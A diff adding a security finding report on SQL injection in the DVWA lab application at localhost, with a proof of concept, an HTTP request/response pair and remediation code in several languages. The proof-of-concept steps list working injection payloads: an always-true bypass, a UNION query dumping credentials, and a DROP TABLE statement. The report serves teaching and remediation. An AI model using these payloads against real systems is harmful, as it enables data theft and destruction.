@@ -1,0 +1,164 @@
+================================================================================
+VULNERABILITY DISCLOSURE REPORT
+Web Application Security Assessment — Project 5
+================================================================================
+Finding ID    : VULN-01
+Date          : June 17, 2026
+Version       : 1.0 — Final
+Classification: Confidential — Internal Use Only
+================================================================================
+
+[1] VULNERABILITY OVERVIEW
+--------------------------------------------------------------------------------
+Title              : SQL Injection (In-Band / Union-Based)
+Vulnerability Type : SQL Injection (SQLi)
+CWE Reference      : CWE-89  — Improper Neutralization of Special Elements
+                     CWE-564 — SQL Injection: Hibernate
+OWASP Top 10       : A03:2021 — Injection
+WSTG Reference     : WSTG-INPV-05 — Testing for SQL Injection
+CAPEC Reference    : CAPEC-66 — SQL Injection
+Severity           : CRITICAL
+CVSS v3.1 Score    : 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+CVSS Vector        : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+Affected Target    : DVWA — SQL Injection Module
+Affected URL       : http://localhost:8080/sqli?id=1&Submit=Submit
+Affected Parameter : id (HTTP GET)
+Remediation Status : UNRESOLVED — Immediate Action Required (P1)
+
+[2] TECHNICAL DESCRIPTION
+--------------------------------------------------------------------------------
+The target web application incorporates user-controlled input from the HTTP GET
+parameter 'id' directly into a dynamically constructed SQL query string without
+applying any form of input validation, sanitization, or parameterization.
+
+The underlying query vulnerable pattern:
+    $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
+
+This construction allows an attacker to inject arbitrary SQL syntax by
+manipulating the 'id' parameter. By closing the string literal with a single
+quote character and appending SQL control logic, the attacker can alter the
+semantic meaning of the query entirely — from a legitimate record lookup to a
+global record extraction, authentication bypass, or database enumeration
+operation.
+
+Root Cause: Absent prepared statements / parameterized queries.
+
+[3] PROOF OF CONCEPT (PoC) — STEPS TO REPRODUCE
+--------------------------------------------------------------------------------
+Environment Required:
+  - Browser or HTTP client (curl, Burp Suite)
+  - Target: http://localhost:8080/sqli
+
+Step 1: Baseline Test — Verify normal application behavior.
+    Input  : id=1
+    Result : Returns a single user record (First name: admin, Surname: admin).
+
+Step 2: Error-Based Probe — Confirm SQL syntax vulnerability.
+    Input  : id=1'
+    Result : Application returns a SQL syntax error message, confirming raw
+             user input is interpolated into the query string.
+
+Step 3: Authentication Bypass / Global Record Dump.
+    Payload: ' OR 1=1 --
+    URL    : http://localhost:8080/sqli?id=%27+OR+1%3D1+--+&Submit=Submit
+    Result : WHERE clause evaluates TRUE for all rows — ALL user records
+             are returned without restriction.
+
+Step 4: UNION-Based Column Extraction.
+    Payload: 1' UNION SELECT user, password FROM users --
+    Result : The UNION appends a second query result set, dumping usernames
+             and hashed credentials directly to the page response.
+
+Step 5: Privilege Escalation (DBMS-Dependent).
+    Payload: 1'; DROP TABLE users; --   [Destructive — Lab demonstration only]
+    Result : Depending on database user privileges, database objects can be
+             modified or destroyed.
+
+[4] TECHNICAL EVIDENCE — HTTP REQUEST / RESPONSE PAIR
+--------------------------------------------------------------------------------
+--- HTTP REQUEST (Attack) ---
+GET /sqli?id=%27+OR+1%3D1+--+&Submit=Submit HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml
+Cookie: PHPSESSID=9a8b7c6d5e4f3a2b1c0d; security=low
+
+--- HTTP RESPONSE (Data Exposure) ---
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+[EXPOSED DATABASE RECORDS — CRITICAL CONFIDENTIALITY BREACH]
+ID: ' OR 1=1 --  | First name: admin   | Surname: admin
+ID: ' OR 1=1 --  | First name: Gordon  | Surname: Brown
+ID: ' OR 1=1 --  | First name: Hack    | Surname: Me
+ID: ' OR 1=1 --  | First name: Pablo   | Surname: Escobar
+ID: ' OR 1=1 --  | First name: Bob     | Surname: Smith
+
+[5] IMPACT ASSESSMENT
+--------------------------------------------------------------------------------
+Confidentiality Impact  : HIGH — Full unauthorized disclosure of all database
+                          records, including user credentials and PII.
+
+Integrity Impact        : HIGH — Attacker can INSERT, UPDATE, or DELETE records
+                          via stacked query attacks (database-dependent).
+
+Availability Impact     : HIGH — Database objects can be dropped or corrupted,
+                          causing denial of service to the application.
+
+Business Impact:
+  - Unauthorized access to personally identifiable information (PII) may
+    constitute a breach under GDPR, PDPA, or applicable data protection law.
+  - Exposure of administrative credentials enables full account takeover.
+  - Regulatory fines, reputational damage, and loss of customer trust.
+  - If database server has elevated OS permissions (xp_cmdshell in MSSQL),
+    this can escalate to Remote Code Execution (RCE) on the host system.
+
+[6] REMEDIATION — SECURE CODE IMPLEMENTATION
+--------------------------------------------------------------------------------
+PRIMARY FIX: Parameterized Queries (Prepared Statements)
+
+PHP — PDO (Recommended):
+    // SECURE: User input is never concatenated into SQL
+    $stmt = $pdo->prepare(
+        'SELECT first_name, last_name FROM users WHERE user_id = :id'
+    );
+    $stmt->execute(['id' => $user_id]);
+    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
+
+PHP — MySQLi:
+    $stmt = $mysqli->prepare(
+        'SELECT first_name, last_name FROM users WHERE user_id = ?'
+    );
+    $stmt->bind_param('i', $user_id);   // 'i' = integer type enforcement
+    $stmt->execute();
+
+Python — DB-API 2.0:
+    cursor.execute(
+        "SELECT first_name, last_name FROM users WHERE user_id = %s",
+        (user_id,)
+    )
+
+Node.js — mysql2:
+    db.query(
+        'SELECT first_name, last_name FROM users WHERE user_id = ?',
+        [userId], callback
+    );
+
+SECONDARY CONTROLS:
+  - Apply strict input type validation: user_id must be a positive integer.
+  - Implement least privilege database accounts (read-only where applicable).
+  - Enable Web Application Firewall (WAF) rules to block common SQLi patterns.
+  - Never expose raw database error messages to end users.
+  - Conduct regular DAST scanning (OWASP ZAP, Burp Suite) as part of CI/CD.
+
+[7] REFERENCES
+--------------------------------------------------------------------------------
+  - OWASP SQL Injection Prevention Cheat Sheet:
+    https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+  - CWE-89: https://cwe.mitre.org/data/definitions/89.html
+  - WSTG-INPV-05: https://owasp.org/www-project-web-security-testing-guide/
+  - NIST SP 800-53: SI-10 Information Input Validation
+
+================================================================================
+END OF FINDING — VULN-01 — SQL INJECTION
+================================================================================
